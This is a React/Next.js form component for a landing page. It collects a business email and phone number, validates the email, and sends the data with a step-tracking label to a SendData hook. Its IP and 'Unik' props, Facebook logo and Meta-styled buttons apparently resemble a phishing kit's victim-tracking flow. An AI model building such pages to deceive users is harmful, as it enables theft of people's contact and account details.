import React, { useState, useContext } from "react";
import styled from "styled-components";
import Image from "next/image";
import SelbyLogo from "../assets/images/selbylogo.png";
import FacebookLogo from "../assets/images/FLogo.png";
import { DataContext } from "../pages";
import SendData from "../hooks/SendData";

// New component imports (will be created in subsequent steps)
import LogoHeader from "./LogoHeader";
import HeroSection from "./HeroSection";
import ActualForm from "./ActualForm";
import PageSectionFooter from "./PageSectionFooter";
import MapSlider from "./MapSlider";
import WhatDrivesUs from "./WhatDrivesUs";

const OverallPageWrapper = styled.div`
  display: flex;
  flex-direction: column;
  min-height: 100vh;
  background-color: #f0f2f5; // A light background for the overall page
  font-family: "Inter", sans-serif; // Added Inter font
`;

const MainContentArea = styled.div`
  flex-grow: 1;
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  // background-color: #1d2761; // This will likely move to a more specific section or be removed
`;

const FormWrapper = styled.div`
  background-color: rgb(243 244 246 / var(--tw-bg-opacity, 1));
  padding: 1rem;
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;

  @media (max-width: 768px) {
    padding: 0.5rem;
  }
`;

const FormContainer = styled.div`
  max-width: 550px;
  width: calc(100% - 1rem);
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  
  @media (max-width: 768px) {
    max-width: 95%;
    width: 95%;
    border-radius: 6px;
  }
`;

const Wrapper = styled.div`
  margin: auto;
  width: 100%;
  border-radius: 10px;
  padding-block: 1rem;
  display: flex;
  flex-direction: column;
  gap: 16px;
  
  @media (max-width: 768px) {
    padding-block: 0.75rem;
    gap: 12px;
    border-radius: 8px;
  }
`;

const Container = styled.div`
  max-width: 400px;
  margin: auto;
  width: calc(100% - 1rem);
  display: flex;
  flex-direction: column;
  align-items: center;
  
  @media (max-width: 768px) {
    max-width: 95%;
    width: 95%;
  }
`;

const Title = styled.div`
  font-weight: 700;
  color: white;
  font-size: 36px;
  text-align: center;
  margin-top: 20px;
  margin-bottom: 10px;
`;

const Subtitle = styled.div`
  color: white;
  font-size: 14px;
  text-align: center;
  margin-bottom: 20px;
`;

const Btn = styled.button`
  background-color: ${(props) => (props.primary ? "#0064e0" : "white")};
  border: none;
  width: 100%;
  color: ${(props) => (props.primary ? "white" : "#333")};
  font-size: 14px;
  font-weight: 500;
  padding: 15px 20px;
  border-radius: 6px;
  text-transform: none;
  line-height: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  margin-bottom: 10px;
  cursor: pointer;
  
  @media (max-width: 768px) {
    padding: 12px 15px;
    font-size: 13px;
    margin-bottom: 8px;
    border-radius: 5px;
  }
`;

const Divider = styled.div`
  display: flex;
  align-items: center;
  width: 100%;
  margin: 15px 0;

  &:before,
  &:after {
    content: "";
    flex: 1;
    border-bottom: 1px solid rgba(255, 255, 255, 0.3);
  }

  span {
    margin: 0 10px;
    color: white;
    font-size: 14px;
  }
`;

const Input = styled.input`
  width: 100%;
  padding: 15px;
  border-radius: 6px;
  border: none;
  margin-bottom: 10px;
  font-size: 14px;
  
  @media (max-width: 768px) {
    padding: 12px;
    margin-bottom: 8px;
    font-size: 13px;
  }
`;

const ErrorLabel = styled.div`
  color: #ff6b6b;
  font-size: 12px;
  margin-bottom: 10px;
  font-weight: 500;
`;

const MainContent = styled.div`
  background-color: #1d2761;
  padding: 20px 0 40px;
  width: 100%;
`;

const Footer = styled.div`
  padding: 20px;
  text-align: center;
`;

const FooterTitle = styled.h2`
  font-weight: 700;
  font-size: 24px;
  margin-bottom: 10px;
`;

const FooterText = styled.p`
  color: #555;
  font-size: 14px;
  line-height: 1.4;
  margin-bottom: 40px;
`;

const IconContainer = styled.div`
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  width: 100%;
  max-width: 800px;
  margin: 30px auto;

  @media (max-width: 768px) {
    justify-content: space-between;
    gap: 20px;
  }
`;

const IconItem = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  width: 22%;
  margin-bottom: 20px;

  @media (max-width: 768px) {
    width: 45%;
    margin-bottom: 50px;
  }
`;

const IconCircle = styled.div`
  width: 80px;
  height: 80px;
  border-radius: 50%;
  border: 1px solid #333;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 15px;

  @media (max-width: 768px) {
    width: 70px;
    height: 70px;
  }

  svg {
    width: 32px;
    height: 32px;

    @media (max-width: 768px) {
      width: 24px;
      height: 24px;
    }
  }
`;

const IconText = styled.p`
  color: #333;
  font-size: 14px;
  line-height: 1.3;
  font-weight: 500;
`;

const LogoContainer = styled.div`
  padding: 15px 0;
  display: flex;
  justify-content: start;
  width: 100%;
  background-color: white;
`;

const LogoWrapper = styled.div`
  position: relative;
  width: 200px;
  height: 50px;
  margin-left: 20px;

  @media (min-width: 768px) {
    width: 250px;
    height: 62px;
    margin-left: 30px;
  }
  
  @media (max-width: 480px) {
    width: 160px;
    height: 40px;
    margin-left: 15px;
  }
`;

function Form({
  setStep,
  Unik,
  setIp,
  Ip,
  BusinessEmail,
  setBusinessEmail,
  setContinueWithFacebook,
}) {
  const [email, setEmail] = useState("");
  const [phone_number, setPhoneNumber] = useState("");
  const [currentStep, setCurrentStep] = useState("");
  const [emailError, setEmailError] = useState("");
  let { AllData, setAllData } = useContext(DataContext);

  const NextStep = (stepText) => {
    let params = {
      ...AllData,
      phone_number: phone_number,
      business_email: email,
      currentStep: stepText ? stepText : "User clicked continue with Facebook",
    };

    setAllData(params);

    SendData(params);
    setTimeout(() => {
      setStep(2);
      // setIsLoading(false)
    }, 100);
  };

  const handleContinueWithEmail = () => {
    // Email validation using regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      // Show error message under the input field
      setEmailError("Please enter a valid email address");
      return;
    }

    // Clear any previous error
    setEmailError("");
    setContinueWithFacebook(false);
    setCurrentStep();

    if (email && setBusinessEmail) {
      setBusinessEmail(email);
    }

    NextStep("User clicked continue with email");
  };

  return (
    <OverallPageWrapper>
      <LogoHeader SelbyLogo={SelbyLogo} />

      <MainContentArea>
        <HeroSection />
        <FormWrapper>
          <FormContainer>
            <ActualForm
              email={email}
              setEmail={setEmail}
              phone_number={phone_number}
              setPhoneNumber={setPhoneNumber}
              emailError={emailError}
              handleContinueWithEmail={handleContinueWithEmail}
              NextStep={NextStep}
              FacebookLogo={FacebookLogo}
            />
          </FormContainer>
        </FormWrapper>

        <MapSlider />
        <WhatDrivesUs />
      </MainContentArea>

      <PageSectionFooter />
    </OverallPageWrapper>
  );
}

export default Form;
